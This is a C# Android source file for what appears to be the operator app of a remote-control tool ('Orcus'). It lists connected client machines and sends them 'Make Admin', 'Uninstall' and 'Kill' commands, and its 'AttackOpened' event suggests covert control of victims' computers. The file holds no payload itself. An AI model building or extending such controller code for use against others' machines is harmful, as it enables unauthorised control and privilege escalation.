
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.Graphics.Drawables;
using Android.Support.V4.View;
using Android.Util;
using Android.Support.V4.App;
using Android.Graphics;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.DynamicCommands.ExecutionEvents;
using Orcus.StaticCommands.Client;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.DynamicCommands.TransmissionEvents;

namespace Orcus.Administration.App
{
	[Activity (Label = "Select Client")]			
	public class ClientsActivity : ListActivity
	{
		protected override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your application here
			ConnectionManager.Current.AttackOpened += ConnectionManager_Current_AttackOpened;;
			ConnectionManager.Current.Disconnected += ConnectionManager_Current_Disconnected;

			ListAdapter = new ClientListItem_Adapter (this, ConnectionManager.Current.Clients);

			ConnectionManager.Current.ClientListChanged += ConnectionManager_Current_ClientListChanged;
			//ListView.ItemLongClick += ListView_ItemLongClick;
			RegisterForContextMenu (ListView);
		}

		public override void OnCreateContextMenu (IContextMenu menu, View v, IContextMenuContextMenuInfo menuInfo)
		{
			base.OnCreateContextMenu (menu, v, menuInfo);
			var info = (Android.Widget.AdapterView.AdapterContextMenuInfo) menuInfo;
			var client = ((ClientListItem_Adapter)ListAdapter).GetClientFromPosition (info.Position);

			menu.Add(0, 0, 0, "Log in");
			menu.Add(1, 1, 0, "Make Admin");
			menu.Add(1, 2, 0, "Uninstall");
			menu.Add(1, 3, 0, "Kill");
			menu.SetHeaderTitle (client.UserName);
		}

		public override bool OnContextItemSelected (IMenuItem item)
		{
			var info = (Android.Widget.AdapterView.AdapterContextMenuInfo) item.MenuInfo;
			var client = ((ClientListItem_Adapter)ListAdapter).GetClientFromPosition (info.Position);

			StaticCommand staticCommand = null;
			switch (item.ItemId) {
			case 0:
				ConnectionManager.Current.LogIn (client.Id);
				break;
			case 1:
				staticCommand = new MakeAdminCommand ();
				break;
			case 2:
				staticCommand = new UninstallCommand ();
				break;
			case 3:
				staticCommand = new KillCommand ();
				break;
			}

			if (staticCommand != null) {
				ConnectionManager.Current.StaticCommander.ExecuteCommand (staticCommand, new ImmediatelyTransmissionEvent(), null, null, 
					CommandTarget.FromClients (new OnlineClientInformation{ Id = client.Id }));
			}

			return true;
		}
		/*
		void ListView_ItemLongClick (object sender, AdapterView.ItemLongClickEventArgs e)
		{
			Toast.MakeText (this, "test", ToastLength.Long).Show ();
			OpenContextMenu ((View)sender);
		}*/

		void ConnectionManager_Current_ClientListChanged (object sender, EventArgs e)
		{
			RunOnUiThread (() => ((ClientListItem_Adapter)ListAdapter).Change ());
		}

		void ConnectionManager_Current_AttackOpened (object sender, EventArgs e)
		{
			StartActivity (typeof(MainActivity));
		}

		void ConnectionManager_Current_Disconnected (object sender, EventArgs e)
		{
			Finish ();
		}

		protected override void OnListItemClick(ListView l, View v, int position, long id)
		{
			var client = ((ClientListItem_Adapter)ListAdapter).GetClientFromPosition (position);
			ConnectionManager.Current.LogIn (client.Id);
		}

		public override void OnBackPressed ()
		{
			base.OnBackPressed ();
			ConnectionManager.Current.Dispose ();
		}
	}
}